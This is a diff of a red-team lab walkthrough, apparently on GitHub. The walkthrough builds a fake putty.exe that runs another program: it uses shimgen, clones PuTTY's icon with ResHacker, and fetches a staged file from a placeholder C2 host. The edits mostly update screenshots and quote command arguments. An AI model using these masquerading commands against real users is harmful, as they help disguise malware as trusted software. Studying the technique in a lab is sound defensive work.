@@ -122,11 +122,11 @@ Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/putty.ico"    -OutFile "C:\Users
 cd C:\Users\Public
 ```
 
-<img width="1652" height="176" alt="image" src="https://github.com/user-attachments/assets/755c8a41-48c8-4dd1-ae53-ce919d1cf22f" />
+<img width="1698" height="248" alt="image" src="https://github.com/user-attachments/assets/695afdff-726d-44a4-9161-a14b3eba0065" />
 
 You can check the status of the file transfers in the Ubuntu server terminal: 
 
-<img width="748" height="287" alt="image" src="https://github.com/user-attachments/assets/8b7ab58c-5a41-4a96-b3cc-5a0441973cf5" />
+<img width="781" height="174" alt="image" src="https://github.com/user-attachments/assets/c4bff68e-744a-4c82-a79a-57807908d761" />
 
 ---
 
@@ -147,9 +147,9 @@ Notepad opens. Inspect the generated file:
 (Get-Item ".\test_basic.exe").Length / 1KB
 ```
 
-<img width="638" height="84" alt="image" src="https://github.com/user-attachments/assets/3b6b6a50-1da7-4fbe-a77c-fb877a128215" />
+<img width="636" height="67" alt="image" src="https://github.com/user-attachments/assets/25844fed-0f80-422e-a1d6-20a0996bd7fa" />
 
-The generated shim weighs approximately **240 KB** — a self-contained binary wrapper. While this size reflects statically linked C++ runtime libraries (ensuring the proxy runs reliably on any Windows build without missing DLL errors), **there is zero Notepad code inside it**. It simply stores a pointer and, at runtime, hands execution over to whatever `--path` specified. This is the structural foundation every subsequent flag builds on.
+The generated shim weighs approximately **226 KB** — a self-contained binary wrapper. While this size reflects statically linked C++ runtime libraries (ensuring the proxy runs reliably on any Windows build without missing DLL errors), **there is zero Notepad code inside it**. It simply stores a pointer and, at runtime, hands execution over to whatever `--path` specified. This is the structural foundation every subsequent flag builds on.
 
 ---
 
@@ -193,17 +193,17 @@ Generate a shim that clones PuTTY's icon but runs `calc.exe` instead:
 
 ```powershell
 .\shimgen.exe --path "C:\Windows\System32\calc.exe" --gui --output ".\test_icon.exe"
-.\ResHacker.exe -open ".\test_icon.exe" -save ".\test_icon.exe" -action delete -mask ICONGROUP,,
-.\ResHacker.exe -open ".\test_icon.exe" -save ".\test_icon.exe" -action add    -res "C:\Users\Public\putty.ico" -mask ICONGROUP,1,0
+.\ResHacker.exe -open ".\test_icon.exe" -save ".\test_icon.exe" -action delete -mask "ICONGROUP,,"
+.\ResHacker.exe -open ".\test_icon.exe" -save ".\test_icon.exe" -action add    -res "C:\Users\Public\putty.ico" -mask "ICONGROUP,1,0"
 ```
 
-<img width="1219" height="165" alt="image" src="https://github.com/user-attachments/assets/d47f3768-9748-4ae0-a8fa-58bb020a6605" />
+<img width="1612" height="833" alt="image" src="https://github.com/user-attachments/assets/7abfd3c1-009d-48a9-ae4a-8e7656b3cb07" />
 
 Open **File Explorer** and navigate to `C:\Users\Public`. You will see `test_icon.exe` bearing the exact PuTTY terminal icon — blue, white, and yellow, pixel-for-pixel identical to the real SSH client in `Program Files`. Double-click it: the Windows Calculator opens.
 
 The filename and icon say PuTTY. The binary runs Calculator. The `ResHacker` utility does not modify any functionality — it purely exploits the fact that users recognise applications by their icon before they read their filename, let alone inspect their internals.
 
-<img width="1260" height="714" alt="image" src="https://github.com/user-attachments/assets/1bb5702e-f98b-4dd6-88bb-7f6afd06323a" />
+<img width="1216" height="640" alt="image" src="https://github.com/user-attachments/assets/c39c97f6-e332-48cd-9da6-92106c951d75" />
 
 >[!NOTE]
 > The `ResHacker` utility applies standalone `.ico` files directly to the target PE binary. This means an attacker is not limited to impersonating applications that are already installed on the endpoint — icons can be pre-harvested and staged on the C2 server (like `putty.ico`) to clone any known application's visual identity, regardless of whether that application exists on the victim machine.
@@ -265,11 +265,11 @@ With a clear understanding of each flag's effect, combine them into the final at
   --output  "C:\Users\Public\Desktop\putty.exe"
 
 # Apply the stolen PuTTY icon
-.\ResHacker.exe -open "C:\Users\Public\Desktop\putty.exe" -save "C:\Users\Public\Desktop\putty.exe" -action delete -mask ICONGROUP,,
-.\ResHacker.exe -open "C:\Users\Public\Desktop\putty.exe" -save "C:\Users\Public\Desktop\putty.exe" -action add    -res "C:\Users\Public\putty.ico" -mask ICONGROUP,1,0
+.\ResHacker.exe -open "C:\Users\Public\Desktop\putty.exe" -save "C:\Users\Public\Desktop\putty.exe" -action delete -mask "ICONGROUP,,"
+.\ResHacker.exe -open "C:\Users\Public\Desktop\putty.exe" -save "C:\Users\Public\Desktop\putty.exe" -action add    -res "C:\Users\Public\putty.ico" -mask "ICONGROUP,1,0"
 ```
 
-<img width="1294" height="467" alt="image" src="https://github.com/user-attachments/assets/69b24f13-1f8a-438e-af04-f97a5b680a11" />
+<img width="1869" height="643" alt="image" src="https://github.com/user-attachments/assets/be3b0e43-7689-4dd8-a3e6-a9e294051320" />
 
 Each flag maps directly back to a capability demonstrated in isolation during Phase 3:
 
@@ -282,6 +282,8 @@ Each flag maps directly back to a capability demonstrated in isolation during Ph
 | `--output Desktop\putty.exe` | Step 1 | Dropper placed at exactly the location the victim expects PuTTY to be. |
 
 Navigate to the Desktop in **File Explorer**. The fake `putty.exe` sits there bearing PuTTY's icon. Nothing — no file size, no icon, no filename, no location — would prompt a victim to hesitate.
+
+<img width="1611" height="841" alt="image" src="https://github.com/user-attachments/assets/2e4b2a45-87ba-4e18-8b7a-79a67f5c4959" />
 
 ---
 
